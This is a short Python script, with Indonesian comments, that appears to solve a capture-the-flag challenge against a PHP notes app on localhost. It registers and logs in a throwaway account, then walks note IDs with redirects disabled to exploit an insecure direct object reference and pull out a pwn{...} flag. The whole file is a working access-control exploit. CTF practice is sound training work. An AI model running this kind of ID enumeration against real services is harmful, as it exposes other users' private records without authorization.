import requests
import random
import string
import re

# PORT 1337 (Sesuai yml lu sekarang)
URL = "http://localhost:1337"

def exploit():
    s = requests.Session()
    
    # --- 1. Register User Random (Biar dapet Session) ---
    username = ''.join(random.choices(string.ascii_lowercase, k=8))
    password = "password123"
    print(f"[*] Registering user: {username}")
    
    # Register
    try:
        s.post(f"{URL}/auth.php", data={
            'action': 'register',
            'username': username,
            'password': password,
            'email': f'{username}@pwn.com'
        })
        
        # Login
        print("[*] Logging in...")
        s.post(f"{URL}/auth.php", data={
            'action': 'login',
            'username': username,
            'password': password
        })

        # --- 2. IDOR Brute Force ---
        print("[*] Starting IDOR enumeration...")
        
        # Kita cek ID 1-10 aja, biasanya flag di ID awal
        for i in range(1, 10): 
            # allow_redirects=False penting buat nge-bypass logic redirect aneh
            r = s.get(f"{URL}/note.php?id={i}", allow_redirects=False)
            
            if r.status_code == 200:
                print(f"\n[+] FOUND NOTE ID: {i}")
                
                # Cek Flag di content
                # Biasanya format pwn{...}
                flag = re.search(r'pwn\{.*?\}', r.text)
                if flag:
                    print(f"[!!!] FLAG FOUND: {flag.group(0)}")
                    return # Stop kalau udah nemu
                else:
                    # Ambil judul kalau gak ada flag
                    title = re.search(r'<h1>(.*?)</h1>', r.text)
                    if title:
                        print(f"    Title: {title.group(1)} (No Flag)")

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()
